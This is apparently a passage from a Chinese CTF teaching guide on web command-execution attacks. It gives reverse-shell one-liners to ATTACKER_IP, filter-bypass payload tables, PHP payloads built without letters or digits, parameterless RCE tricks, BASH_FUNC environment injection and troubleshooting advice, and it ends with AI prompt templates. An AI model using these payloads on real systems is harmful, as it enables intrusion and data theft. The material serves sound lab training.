+<div class="language-bash highlight"><span class="filename">Bash</span><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1"></a><a href="#__codelineno-15-1"><span class="linenos" data-linenos="1 "></span></a>bash<span class="w"> </span>-c<span class="w"> </span><span class="s2">"bash -i &gt;&amp; /dev/tcp/ATTACKER_IP/4444 0&gt;&amp;1"</span>
+<a id="__codelineno-15-2" name="__codelineno-15-2"></a><a href="#__codelineno-15-2"><span class="linenos" data-linenos="2 "></span></a>nc<span class="w"> </span>ATTACKER_IP<span class="w"> </span><span class="m">4444</span><span class="w"> </span>-e<span class="w"> </span>/bin/sh<span class="w">          </span><span class="c1"># 目标有 nc -e 时（很多发行版阉割了）</span>
+</code></pre></div>
+<p>攻击机侧先监听：<code>nc -lvnp 4444</code>（Ubuntu 的 nc 是 openbsd 版，需要 <code>nc -lvnp</code>；也可以直接上 <a href="https://pwncat.readthedocs.io/">pwncat-cs</a> 获得更好的交互体验）。</p>
+<div class="admonition note">
+<p class="admonition-title">原理比 payload 重要</p>
+<p>反弹 shell 的本质是<strong>文件描述符重定向</strong>：把 stdin/stdout/stderr 绑到一个 TCP 连接上。理解了这一点，各种变体（<code>/dev/tcp</code>、<code>mkfifo</code>、python/perl/php 一句话反弹）都能自己推出来，网上那些"反弹 shell 命令生成器"就只是省事工具而已。本文实测确认了 <code>/dev/tcp</code> 这条通道可用（成功把文件内容发到了监听端），但正式 exp 仍建议先在目标同版本系统上验一次。</p>
+</div>
+<h2 id="bypass">8. 绕过过滤：黑名单攻防速查表<a class="headerlink" href="#bypass" title="Permanent link">&para;</a></h2>
+<p>这一节是命令执行的核心技能，<strong>建议从头到尾在靶场里各打一遍</strong>。</p>
+<h3 id="81">8.1 空格被过滤<a class="headerlink" href="#81" title="Permanent link">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th>绕过</th>
+<th>Payload</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>$IFS</code></td>
+<td><code>cat${IFS}/flag</code></td>
+<td>最稳，<code>$IFS</code> 默认就是空格/制表/换行</td>
+</tr>
+<tr>
+<td><code>$IFS$9</code></td>
+<td><code>cat$IFS$9/flag</code></td>
+<td><code>$9</code> 是空字符串，用于切断变量名</td>
+</tr>
+<tr>
+<td>TAB</td>
+<td><code>cat%09/flag</code></td>
+<td>Web 场景下把空格换成 <code>%09</code></td>
+</tr>
+<tr>
+<td>重定向</td>
+<td><code>cat</code>&lt;<code>/flag</code></td>
+<td>⚠️ 重定向目标<strong>不做通配符展开</strong>，文件名必须确定</td>
+</tr>
+<tr>
+<td>花括号</td>
+<td><code>{cat,/flag}</code></td>
+<td><strong>仅 bash 生效</strong>，dash/ash 不行</td>
+</tr>
+<tr>
+<td>十六进制</td>
+<td><code>cat$'\x20'/flag</code></td>
+<td><code>$'...'</code> 是 bash/ksh 特性，ash 不支持</td>
+</tr>
+</tbody>
+</table>
+<h3 id="82-flagcat">8.2 关键词（<code>flag</code>、<code>cat</code>、<code>/</code>）被过滤<a class="headerlink" href="#82-flagcat" title="Permanent link">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th>绕过</th>
+<th>Payload</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>引号拼接</td>
+<td><code>c''at /flag</code>、<code>wh''oami</code></td>
+<td>shell 会把空引号去掉</td>
+</tr>
+<tr>
+<td>反斜杠</td>
+<td><code>c\at /flag</code></td>
+<td></td>
+</tr>
+<tr>
+<td>通配符</td>
+<td><code>cat /fla?</code>、<code>cat /f*</code>、<code>cat /???/??????</code></td>
+<td>最常用</td>
+</tr>
+<tr>
+<td>字符集</td>
+<td><code>cat /[f]lag</code></td>
+<td></td>
+</tr>
+<tr>
+<td>变量拼接</td>
+<td><code>a=c;b=at;$a$b /flag</code></td>
+<td></td>
+</tr>
+<tr>
+<td>反斜杠+斜杠</td>
+<td><code>cat ${HOME:0:1}flag</code></td>
+<td><code>${HOME:0:1}</code> = <code>/</code></td>
+</tr>
+<tr>
+<td>base64 解码执行</td>
+<td><code>`echo Y2F0IC9mbGFn | base64 -d`</code></td>
+<td>base64 内容里没有敏感关键词</td>
+</tr>
+<tr>
+<td>十六进制</td>
+<td><code>echo -n 636174202f666c6167 | xxd -r -p | bash</code></td>
+<td></td>
+</tr>
+<tr>
+<td>八进制/printf</td>
+<td><code>$(printf "\143\141\164\040\057\146\154\141\147")</code></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<div class="admonition tip">
+<p class="admonition-title">通配符是命令执行的万能钥匙</p>
+<p><code>*</code>（任意长度）、<code>?</code>（单字符）、<code>[]</code>（字符集）、<code>{}</code>（bash 枚举）不仅能绕关键词，还能绕"不知道真实文件名"的场景。思路：<code>/???/???</code> 之类的短模式扫一遍。</p>
+</div>
+<h3 id="83-rce">8.3 字母数字被过滤（无字母数字 RCE）<a class="headerlink" href="#83-rce" title="Permanent link">&para;</a></h3>
+<p>三种主流思路，都要靠脚本构造 payload：</p>
+<ol>
+<li><strong>取反</strong>（PHP 7+ 通用，最省事）：对函数名/参数做按位取反，得到不可见字符。</li>
+<li><strong>异或</strong>：两个允许字符异或出目标字符，需要脚本枚举字符集。</li>
+<li><strong>自增</strong>：利用 PHP 字符串自增（<code>'a'++</code> → <code>'b'</code>、<code>'A'++</code> → <code>'B'</code>）拼出函数名。</li>
+</ol>
+<p><strong>取反（已实测，直接可用）</strong>：</p>
+<div class="language-php highlight"><span class="filename">PHP</span><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1"></a><a href="#__codelineno-16-1"><span class="linenos" data-linenos="1 "></span></a><span class="cp">&lt;?php</span>
+<a id="__codelineno-16-2" name="__codelineno-16-2"></a><a href="#__codelineno-16-2"><span class="linenos" data-linenos="2 "></span></a><span class="c1">// 生成器：把 system 和要执行的命令取反后拼成 payload</span>
+<a id="__codelineno-16-3" name="__codelineno-16-3"></a><a href="#__codelineno-16-3"><span class="linenos" data-linenos="3 "></span></a><span class="nv">$f</span> <span class="o">=</span> <span class="s1">'system'</span><span class="p">;</span>
+<a id="__codelineno-16-4" name="__codelineno-16-4"></a><a href="#__codelineno-16-4"><span class="linenos" data-linenos="4 "></span></a><span class="nv">$c</span> <span class="o">=</span> <span class="s1">'cat /flag'</span><span class="p">;</span>
+<a id="__codelineno-16-5" name="__codelineno-16-5"></a><a href="#__codelineno-16-5"><span class="linenos" data-linenos="5 "></span></a><span class="k">echo</span> <span class="s2">"(~'"</span> <span class="o">.</span> <span class="nb">urlencode</span><span class="p">(</span><span class="o">~</span><span class="nv">$f</span><span class="p">)</span> <span class="o">.</span> <span class="s2">"')(~'"</span> <span class="o">.</span> <span class="nb">urlencode</span><span class="p">(</span><span class="o">~</span><span class="nv">$c</span><span class="p">)</span> <span class="o">.</span> <span class="s2">"');"</span><span class="p">;</span>
+<a id="__codelineno-16-6" name="__codelineno-16-6"></a><a href="#__codelineno-16-6"><span class="linenos" data-linenos="6 "></span></a><span class="c1">// 输出形如：(~'%8C%86%8C%8B%9A%92')(~'%9C%9E%8B%DF...');</span>
+</code></pre></div>
+<p>把生成的串<strong>原样</strong>放进 URL（<code>%XX</code> 不要再编码一次）：</p>
+<div class="language-text highlight"><span class="filename">Text Only</span><pre><span></span><code><a id="__codelineno-17-1" name="__codelineno-17-1"></a><a href="#__codelineno-17-1"><span class="linenos" data-linenos="1 "></span></a>?code=(~'%8C%86%8C%8B%9A%92')(~'%9C%9E%8B%DF%D0%8B%92%8F%D0%97%8B%8B%8F%93%9E%9D%D0%99%93%9E%98');
+</code></pre></div>
+<p>这套 payload 不含任何字母数字，能直接绕过 <code>/[A-Za-z0-9]+/</code> 这类过滤（在 RCE-labs Level 25 的源码上实测读出了文件内容）。</p>
+<p><strong>自增的起手式（下面这几行实测在 PHP 8 上也成立）</strong>：</p>
+<div class="language-php highlight"><span class="filename">PHP</span><pre><span></span><code><a id="__codelineno-18-1" name="__codelineno-18-1"></a><a href="#__codelineno-18-1"><span class="linenos" data-linenos="1 "></span></a><span class="x">$_   = ([].'')[''=='_'];                      // false 当索引 0 → "A"</span>
+<a id="__codelineno-18-2" name="__codelineno-18-2"></a><a href="#__codelineno-18-2"><span class="linenos" data-linenos="2 "></span></a><span class="x">$_++;                                         // "A" → "B"：PHP 的字符串自增</span>
+<a id="__codelineno-18-3" name="__codelineno-18-3"></a><a href="#__codelineno-18-3"><span class="linenos" data-linenos="3 "></span></a><span class="x">$__  = ([].'')[''==''];                       // true 当索引 1 → "r"</span>
+<a id="__codelineno-18-4" name="__codelineno-18-4"></a><a href="#__codelineno-18-4"><span class="linenos" data-linenos="4 "></span></a><span class="x">$___ = ([].'')[(''=='')+(''=='')+(''=='')];   // 3 → "a"</span>
+<a id="__codelineno-18-5" name="__codelineno-18-5"></a><a href="#__codelineno-18-5"><span class="linenos" data-linenos="5 "></span></a><span class="x">$___++;$___++;                                // → "c"</span>
+</code></pre></div>
+<p><code>([].'')</code> 得到字符串 <code>"Array"</code>，用 <code>''==''</code>（真）和 <code>''=='_'</code>（假）当索引，就<strong>不需要写任何数字</strong>。拿到大写起点 <code>"A"</code> 和小写起点 <code>"a"</code> 之后，靠 <code>++</code> 就能拼出任意字母，再用 <code>chr()</code> 配合构造出的数字拼出变量名与函数名。</p>
+<p>完整 payload 是把「变量名」（<code>_GET</code>/<code>_POST</code>）和「函数名」都这样一点点拼出来的长链，RCE-labs Level 23 给的形态大致以 <code>$_=(_/_._)[''=='_'];</code> 开头、一路 <code>++</code> 拼到 <code>$_POST</code> 再调用。</p>
+<div class="admonition warning">
+<p class="admonition-title">别急着抄自增 payload</p>
+<p>PHP 8 起「未定义常量」从"警告并当字符串用"变成 <strong>Fatal error</strong>，所以 <code>_/_._</code> 这类依赖裸字符串常量的技巧会直接报错；此外 <code>create_function</code>、<code>assert</code> 的字符串执行、<code>preg_replace</code> 的 <code>/e</code> 也都已经移除。<strong>判断目标 PHP 版本永远是你的第一步</strong>（<code>phpinfo()</code>、报错信息、<code>X-Powered-By</code>）。详细的脚本与推导看：
+- <a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">一些不包含数字和字母的 webshell</a>
+- <a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">无字母数字 webshell 之提高篇</a>
+- <a href="https://probiusofficial.github.io/bashFuck/">bashFuck（探姬）</a>
+- <a href="https://probiusofficial.github.io/PHP-inversion/">PHP-inversion：取反 payload 在线生成</a></p>
+</div>
+<h3 id="84-rce">8.4 无参数（无参 RCE）<a class="headerlink" href="#84-rce" title="Permanent link">&para;</a></h3>
+<p>过滤形如 <code>preg_replace('/[^\W]+\((?R)?\)/', '', $code)</code> 时，<strong>只允许"不带参数的函数嵌套调用"</strong>，见 <a href="#no-param-rce">第 9.2 节</a>。</p>
+<h3 id="85-7-5-4">8.5 长度限制（7 / 5 / 4 字符）<a class="headerlink" href="#85-7-5-4" title="Permanent link">&para;</a></h3>
+<p>经典题组：题目对 <code>strlen($_GET[1])</code> 做了限制（7 字符 / 5 字符 / 4 字符），一次只能发一小段。核心是<strong>先用文件名拼出命令，再执行脚本文件</strong>：</p>
+<ol>
+<li>用最短的命令（<code>w</code>、<code>ls</code>）配合重定向，把内容"写进文件名"：</li>
+</ol>
+<div class="language-bash highlight"><span class="filename">Bash</span><pre><span></span><code><a id="__codelineno-19-1" name="__codelineno-19-1"></a><a href="#__codelineno-19-1"><span class="linenos" data-linenos="1 "></span></a>w<span class="w"> </span>&gt;<span class="w"> </span>hp<span class="w">     </span><span class="c1"># 执行 w，输出重定向到文件 hp —— 文件名叫 hp，内容是 w 的输出</span>
+</code></pre></div>
+<ol>
+<li>用 <code>ls -t</code>（按修改时间倒序）把散落的文件名按需要的顺序拼成一条命令；</li>
+<li>用 <code>sh 拼出来的文件</code> 执行它。</li>
+</ol>
+<p>这就是"换行符不影响命令执行"这一特性的极端应用。</p>
+<p>参考题解：<a href="https://www.leavesongs.com/SHARE/some-tricks-from-my-secret-group.html">7 字符（phith0n）</a>、<a href="https://github.com/ProbiusOfficial/RCE-labs">HITCON 2017 babyfirst-revenge（5 字符）与 babyfirst-revenge-v2（4 字符）</a>——对应 RCE-labs 的 Level 14 / 15 / 16。</p>
+<h3 id="disable-functions">8.6 <code>disable_functions</code> 禁用函数<a class="headerlink" href="#disable-functions" title="Permanent link">&para;</a></h3>
+<p>看到 <code>Warning: system() has been disabled for security reasons</code> 就说明撞上 <code>disable_functions</code> 了。</p>
+<table>
+<thead>
+<tr>
+<th>方向</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>换函数</td>
+<td><code>exec</code>/<code>shell_exec</code>/<code>passthru</code>/<code>popen</code>/<code>pcntl_exec</code>/反引号/<code>mail</code> 等轮流试；<code>pcntl_exec</code> 属扩展，常被漏封</td>
+</tr>
+<tr>
+<td>直接读文件</td>
+<td><code>print_r</code>、<code>scandir</code>、<code>glob</code>、<code>file_get_contents</code>、<code>highlight_file</code>、<code>SplFileObject</code>、<code>DirectoryIterator</code></td>
+</tr>
+<tr>
+<td>绕过原理</td>
+<td><code>LD_PRELOAD</code> 劫持、<code>FFI</code>、<code>pcntl_exec</code>、<code>GC UAF</code>、ImageMagick 命令注入、<code>curl --engine</code>、<code>cnext (CVE-2024-2961)</code></td>
+</tr>
+</tbody>
+</table>
+<div class="admonition tip">
+<p class="admonition-title">先判断再选武器</p>
+<p><code>disable_functions</code> 往往只封了"命令执行"这一类函数，<strong>读文件的能力通常还在</strong>——很多题根本不需要真正的 shell，读到 flag 就赢了。完整清单见文末参考中的《RCE总结》。</p>
+</div>
+<h3 id="87">8.7 环境变量注入（进阶但好用）<a class="headerlink" href="#87" title="Permanent link">&para;</a></h3>
+<p>源码形态（RCE-labs Level 18）：</p>
+<div class="language-php highlight"><span class="filename">PHP</span><pre><span></span><code><a id="__codelineno-20-1" name="__codelineno-20-1"></a><a href="#__codelineno-20-1"><span class="linenos" data-linenos="1 "></span></a><span class="x">foreach($_REQUEST['envs'] as $key =&gt; $val) {</span>
+<a id="__codelineno-20-2" name="__codelineno-20-2"></a><a href="#__codelineno-20-2"><span class="linenos" data-linenos="2 "></span></a><span class="x">    putenv("{$key}={$val}");   // 变量名和值都完全可控</span>
+<a id="__codelineno-20-3" name="__codelineno-20-3"></a><a href="#__codelineno-20-3"><span class="linenos" data-linenos="3 "></span></a><span class="x">}</span>
+<a id="__codelineno-20-4" name="__codelineno-20-4"></a><a href="#__codelineno-20-4"><span class="linenos" data-linenos="4 "></span></a><span class="x">system('echo hello');          // 注意：执行的是 bash 内置命令 echo</span>
+</code></pre></div>
+<p>既然变量名可控，就可以注入 <code>BASH_FUNC_xxx%%</code> 形式的环境变量（<code>xxx</code> 换成 <code>system()</code> 里被调用的那个命令名，例如 <code>echo</code>），把要执行的内置命令<strong>替换</strong>成我们的代码：</p>
+<div class="language-text highlight"><span class="filename">Text Only</span><pre><span></span><code><a id="__codelineno-21-1" name="__codelineno-21-1"></a><a href="#__codelineno-21-1"><span class="linenos" data-linenos="1 "></span></a>?envs[BASH_FUNC_echo%%]=() { cat /flag; }
+</code></pre></div>
+<p>URL 里 <code>%</code> 要写成 <code>%25</code>、空格写成 <code>%20</code>，即：</p>
+<div class="language-text highlight"><span class="filename">Text Only</span><pre><span></span><code><a id="__codelineno-22-1" name="__codelineno-22-1"></a><a href="#__codelineno-22-1"><span class="linenos" data-linenos="1 "></span></a>?envs%5BBASH_FUNC_echo%25%25%5D=%28%29+%7B+cat+%2Fflag%3B+%7D
+</code></pre></div>
+<p>原理：bash 启动时会从环境变量里导入 <code>BASH_FUNC_xxx%%</code> 形式的函数定义（这正是 Shellshock 系列漏洞的机制）。实测注意两点：</p>
+<ul>
+<li>值必须是 <code>() { 命令; }</code> 的完整形式（<code>)</code> 与 <code>{</code> 之间、<code>{</code> 与命令之间要有空格，少了空格就不生效）；</li>
+<li>打过补丁的 bash 用带 <code>%%</code> 的变量名形式；更老的、未打补丁的 bash 用不带 <code>%%</code> 的 <code>BASH_FUNC_echo()</code> 形式。</li>
+</ul>
+<p>详见 <a href="https://www.leavesongs.com/PENETRATION/how-I-hack-bash-through-environment-injection.html">phith0n：我是如何利用环境变量注入执行任意命令</a>。</p>
+<h2 id="php">9. PHP 专项<a class="headerlink" href="#php" title="Permanent link">&para;</a></h2>
+<h3 id="91">9.1 危险函数表<a class="headerlink" href="#91" title="Permanent link">&para;</a></h3>
+<p><strong>代码执行类：</strong></p>
+<table>
+<thead>
+<tr>
+<th>函数</th>
+<th>说明</th>
+<th>版本注意</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>eval()</code></td>
+<td>把字符串当 PHP 代码执行；是<strong>语言构造器</strong>，不能被 <code>disable_functions</code> 禁用</td>
+<td>全版本</td>
+</tr>
+<tr>
+<td><code>assert()</code></td>
+<td>PHP &lt; 8 时字符串参数会当代码 <code>eval</code></td>
+<td><strong>PHP 8.0 起移除此行为</strong></td>
+</tr>
+<tr>
+<td><code>create_function()</code></td>
+<td>内部 <code>eval</code>，可提前闭合 <code>}</code> 注入代码</td>
+<td>PHP 7.2 废弃，<strong>8.0 移除</strong></td>
+</tr>
+<tr>
+<td><code>preg_replace()</code></td>
+<td>依赖 <code>/e</code> 修饰符执行替换结果</td>
+<td><strong>PHP 7.0 起移除 <code>/e</code></strong></td>
+</tr>
+<tr>
+<td><code>call_user_func()</code> / <code>call_user_func_array()</code></td>
+<td>回调任意函数，如 <code>call_user_func('system','id')</code></td>
+<td>全版本</td>
+</tr>
+<tr>
+<td><code>array_map()</code> / <code>usort()</code> / <code>array_filter()</code> / <code>array_reduce()</code> / <code>ob_start()</code></td>
+<td>把可控参数当回调</td>
+<td>全版本</td>
+</tr>
+<tr>
+<td><code>${}</code></td>
+<td>复杂变量解析，配合 <code>eval</code> 间接执行</td>
+<td>—</td>
+</tr>
+</tbody>
+</table>
+<p><strong>命令执行类：</strong></p>
+<table>
+<thead>
+<tr>
+<th>函数</th>
+<th>回显</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>system()</code></td>
+<td>直接输出</td>
+<td>底层 <code>sh -c</code>，最常考</td>
+</tr>
+<tr>
+<td><code>passthru()</code></td>
+<td>直接输出</td>
+<td>输出原始数据</td>
+</tr>
+<tr>
+<td><code>exec()</code></td>
+<td>只返回最后一行（需自己 <code>echo</code>）</td>
+<td>常造成"无回显"假象</td>
+</tr>
+<tr>
+<td><code>shell_exec()</code></td>
+<td>返回完整输出（需自己 <code>echo</code>）</td>
+<td>—</td>
+</tr>
+<tr>
+<td><code>popen()</code></td>
+<td>返回文件指针</td>
+<td>需 <code>fgets</code> 才看得到</td>
+</tr>
+<tr>
+<td><code>pcntl_exec()</code></td>
+<td>无</td>
+<td><code>pcntl</code> 扩展专有</td>
+</tr>
+<tr>
+<td><code>`cmd`</code></td>
+<td>返回输出</td>
+<td>反引号与 <code>shell_exec</code> 等价</td>
+</tr>
+</tbody>
+</table>
+<h3 id="no-param-rce">9.2 无参 RCE 工具箱<a class="headerlink" href="#no-param-rce" title="Permanent link">&para;</a></h3>
+<p>过滤规则（RCE-labs Level 24）：</p>
+<div class="language-php highlight"><span class="filename">PHP</span><pre><span></span><code><a id="__codelineno-23-1" name="__codelineno-23-1"></a><a href="#__codelineno-23-1"><span class="linenos" data-linenos="1 "></span></a><span class="x">if(';' === preg_replace('/[^\W]+\((?R)?\)/', '', $code)){</span>
+<a id="__codelineno-23-2" name="__codelineno-23-2"></a><a href="#__codelineno-23-2"><span class="linenos" data-linenos="2 "></span></a><span class="x">    eval($code);</span>
+<a id="__codelineno-23-3" name="__codelineno-23-3"></a><a href="#__codelineno-23-3"><span class="linenos" data-linenos="3 "></span></a><span class="x">}</span>
+</code></pre></div>
+<p>意思是：只允许形如 <code>a(b(c()))</code> 的<strong>无参函数嵌套</strong>。以下技巧均在本地靶场源码上实测可用：</p>
+<table>
+<thead>
+<tr>
+<th>目的</th>
+<th>Payload</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>列出当前目录</td>
+<td><code>?code=print_r(scandir(current(localeconv())));</code></td>
+</tr>
+<tr>
+<td>换目录（父目录）</td>
+<td><code>?code=print_r(scandir(dirname(getcwd())));</code></td>
+</tr>
+<tr>
+<td>进子目录再列</td>
+<td><code>?code=chdir(next(scandir(getcwd())));print_r(scandir(getcwd()));</code></td>
+</tr>
+<tr>
+<td>读文件（语法高亮）</td>
+<td><code>?code=highlight_file(next(array_reverse(scandir(current(localeconv())))));</code></td>
+</tr>
+<tr>
+<td>从请求头里取代码执行</td>
+<td><code>?code=eval(next(getallheaders()));</code> + <code>User-Agent: system('cat /flag');</code></td>
+</tr>
+<tr>
+<td>同上（自定义头）</td>
+<td><code>?code=eval(end(getallheaders()));</code> + <code>X-Cmd: system('cat /flag');</code></td>
+</tr>
+</tbody>
+</table>
+<div class="admonition tip">
+<p class="admonition-title">无参 RCE 的调参口诀</p>
+<ul>
+<li><code>localeconv()</code> 的第一个值是 <code>.</code>（当前目录），所以 <code>current(localeconv())</code> 常用来喂给 <code>scandir()</code>。</li>
+<li><code>scandir()</code> 的结果是<strong>按文件名排序</strong>的，<code>next()</code> 拿的是"排序后的第二个"。<strong>文件顺序变了 payload 就失效</strong>——这就是为什么 writeup 里的 <code>next()</code> 数量你别照抄，要看自己目标目录的文件列表。</li>
+<li><code>array_reverse()</code> 把数组倒过来，通常是为了少写几个 <code>next()</code>。</li>
+</ul>
+</div>
+<div class="admonition warning">
+<p class="admonition-title"><code>session_id()</code> 技巧为什么现在常常打不通</p>
+<p><code>?code=show_source(session_id(session_start()));</code> + <code>Cookie: PHPSESSID=flag.php</code> 是老 writeup 的常客。它依赖"<code>session_start()</code> 原样保留 Cookie 里的 id"。在较新的 PHP 上，会话 id 校验/strict 模式会重新生成 id，<strong>除非保存路径里已存在对应的会话文件（<code>sess_</code> 前缀加会话 id）</strong>，此技巧就会失效。本文实测 PHP 8.4 下不生效。老 payload 打不通时，先怀疑这种版本差异，不要怀疑自己敲错了。</p>
+</div>
+<h3 id="93-disable_functions">9.3 突破 <code>disable_functions</code>（了解即可）<a class="headerlink" href="#93-disable_functions" title="Permanent link">&para;</a></h3>
+<p>按投入产出排序的建议：<strong>先用 PHP 内置函数读文件 → 再试漏封的命令执行函数 → 最后才上 Pwn 级技巧</strong>（FFI / GC UAF / LD_PRELOAD / 漏洞链）。后者属于进阶内容，新生阶段知道"有这条路"就够了，具体手法见参考中的《RCE总结》。</p>
+<h2 id="why-fail">10. 为什么你的 payload 打不通<a class="headerlink" href="#why-fail" title="Permanent link">&para;</a></h2>
+<p>这是<strong>全文最值钱的一节</strong>。你抄来的 payload 90% 不是写错了，而是<strong>环境对不上</strong>。</p>
+<table>
+<thead>
+<tr>
+<th>症状</th>
+<th>常见原因</th>
+<th>怎么办</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>eval</code> 里 payload 直接 Fatal error</td>
+<td>PHP 8 起未定义常量报错，裸字符串常量技巧失效</td>
+<td>先确定 PHP 版本；换取反/异或写法</td>
+</tr>
+<tr>
+<td><code>assert()</code> 不走字符串代码</td>
+<td>PHP 8.0 移除该行为</td>
+<td>换 <code>eval</code>；确认版本</td>
+</tr>
+<tr>
+<td><code>create_function</code> / <code>preg_replace('/e')</code> 不存在</td>
+<td>PHP 8.0 / 7.0 已移除</td>
+<td>换等价函数</td>
+</tr>
+<tr>
+<td>命令分隔符没生效</td>
+<td>输入被 <code>escapeshellarg()</code> 转义、或被 WAF 拦 <code>;</code> <code>&amp;</code></td>
+<td>用 <code>%0a</code>；确认数据流向</td>
+</tr>
+<tr>
+<td><code>%0a</code> 变成了字面量</td>
+<td>URL 只解码一次，或你的工具二次编码</td>
+<td>用 Burp 看<strong>原始请求</strong>，别用浏览器地址栏</td>
+</tr>
+<tr>
+<td><code>{cat,/flag}</code>、<code>$'\x20'</code> 不生效</td>
+<td>这两个是 bash 专属语法，dash/ash（Debian 的 <code>/bin/sh</code>、alpine 的 ash）不支持</td>
+<td>换 <code>$IFS</code>、<code>%09</code>；先确认目标 <code>/bin/sh</code> 指向什么</td>
+</tr>
+<tr>
+<td><code>cat</code>&lt;<code>/flag*</code> 报 No such file</td>
+<td><strong>重定向目标不做通配符展开</strong>（dash/ash/POSIX sh）</td>
+<td>文件名写全，或把通配符放在参数位</td>
+</tr>
+<tr>
+<td><code>||</code> 后面的命令不执行</td>
+<td>前一条命令成功了</td>
+<td>换 <code>;</code>，或让前一条故意失败</td>
+</tr>
+<tr>
+<td>命令执行了但页面没东西</td>
+<td>无回显（<code>&gt;/dev/null</code>、<code>exec</code> 只返回最后一行、缓冲区被清）</td>
+<td>见 <a href="#no-echo">第 7 节</a></td>
+</tr>
+<tr>
+<td>带外收到的内容缺了 <code>{}</code></td>
+<td><code>curl</code> 的 URL glob 把 <code>{}</code> 当范围展开</td>
+<td>加 <code>-g</code>，或先 <code>base64</code></td>
+</tr>
+<tr>
+<td>带外内容末尾多 <code>%0A</code></td>
+<td><code>base64</code> 输出带换行</td>
+<td><code>| tr -d '\n'</code></td>
+</tr>
+<tr>
+<td><code>Permission denied</code></td>
+<td>当前用户权限不足 / <code>open_basedir</code> 限制</td>
+<td><code>id</code> 看权限；找 <code>readflag</code>、SUID</td>
+</tr>
+<tr>
+<td>只能读不能执行</td>
+<td><code>disable_functions</code></td>
+<td>见 <a href="#disable-functions">8.6</a></td>
+</tr>
+<tr>
+<td>请求发出去没反应</td>
+<td>WAF 直接 403，不是 payload 问题</td>
+<td>用 Burp 看响应码与长度，逐字符二分定位被拦的字符</td>
+</tr>
+</tbody>
+</table>
+<div class="admonition tip">
+<p class="admonition-title">定位过滤规则的标准动作</p>
+<ol>
+<li>发一个<strong>绝对合法</strong>的请求（如 <code>?ip=127.0.0.1</code>），确认 200。</li>
+<li>加上一个字符（<code>;</code>、空格、<code>/</code>），看是否被拦 —— 这就是<strong>二分法</strong>确定黑名单。</li>
+<li>把命中的字符换成绕过写法，其余保持不变。</li>
+<li>每步都用 Burp 看<strong>原始请求与响应</strong>，不要靠猜。</li>
+</ol>
+</div>
+<h2 id="11-ai">11. AI 时代怎么学命令执行<a class="headerlink" href="#11-ai" title="Permanent link">&para;</a></h2>
+<p>命令执行的知识点极度碎片化（<code>$IFS</code> 有几种写法、PHP 有几个版本、shell 有几个分支），这正是 AI 最擅长补位的场景；但也正是<strong>最容易让人以为自己学会了</strong>的场景。</p>
+<h3 id="111-ai">11.1 把 AI 当成三种角色，而不是"答案机器"<a class="headerlink" href="#111-ai" title="Permanent link">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th>角色</th>
+<th>怎么用</th>
+<th>例子</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>解释器</strong></td>
+<td>贴一段 payload，让它逐字符拆解</td>
+<td>"逐字符解释 <code>cat$IFS$9/flag</code> 为什么等价于 <code>cat /flag</code>"</td>
+</tr>
+<tr>
+<td><strong>出题人</strong></td>
+<td>让它写一个带过滤的靶场代码，你本地打</td>
+<td>"写一个 PHP 靶场，过滤空格和 <code>flag</code> 关键字，但保留可绕过的漏洞"</td>
+</tr>
+<tr>
+<td><strong>陪练/复读机</strong></td>
+<td>让它给同一目标的 3 种不同解法、再给反制</td>
+<td>"针对这个过滤规则，再给我 3 种绕过思路，并说明各自的失败条件"</td>
+</tr>
+</tbody>
+</table>
+<p><strong>可复制的提问模板：</strong></p>
+<div class="language-text highlight"><span class="filename">Text Only</span><pre><span></span><code><a id="__codelineno-24-1" name="__codelineno-24-1"></a><a href="#__codelineno-24-1"><span class="linenos" data-linenos="1 "></span></a>【角色】你是有 CTF 出题经验的 Web 安全讲师。
+<a id="__codelineno-24-2" name="__codelineno-24-2"></a><a href="#__codelineno-24-2"><span class="linenos" data-linenos="2 "></span></a>【背景】我在做命令执行靶场，源码是：&lt;贴源码&gt;
+<a id="__codelineno-24-3" name="__codelineno-24-3"></a><a href="#__codelineno-24-3"><span class="linenos" data-linenos="3 "></span></a>【现状】我发 ?cmd=cat${IFS}/flag，返回 WAF!；发 ?cmd=cat&lt;/flag 返回 200 但无输出。
+<a id="__codelineno-24-4" name="__codelineno-24-4"></a><a href="#__codelineno-24-4"><span class="linenos" data-linenos="4 "></span></a>【要求】1) 推断过滤规则；2) 给 3 种绕过思路并说明原理；
+<a id="__codelineno-24-5" name="__codelineno-24-5"></a><a href="#__codelineno-24-5"><span class="linenos" data-linenos="5 "></span></a>        3) 明确哪些方案依赖 bash、哪些依赖 PHP 版本；4) 不要直接给 flag。
+</code></pre></div>
+<div class="language-text highlight"><span class="filename">Text Only</span><pre><span></span><code><a id="__codelineno-25-1" name="__codelineno-25-1"></a><a href="#__codelineno-25-1"><span class="linenos" data-linenos="1 "></span></a>【任务】把我贴的这段 payload 拆成"编码层 / 语言层 / shell 层"三部分，
+<a id="__codelineno-25-2" name="__codelineno-25-2"></a><a href="#__codelineno-25-2"><span class="linenos" data-linenos="2 "></span></a>说明每一层发生了什么变换，并指出如果目标换成 alpine(ash) 或 PHP 8 会在哪一步失败。
+<a id="__codelineno-25-3" name="__codelineno-25-3"></a><a href="#__codelineno-25-3"><span class="linenos" data-linenos="3 "></span></a>&lt;payload&gt;
+</code></pre></div>
+<div class="language-text highlight"><span class="filename">Text Only</span><pre><span></span><code><a id="__codelineno-26-1" name="__codelineno-26-1"></a><a href="#__codelineno-26-1"><span class="linenos" data-linenos="1 "></span></a>【任务】给我一份在本地复现这个漏洞的最简环境：
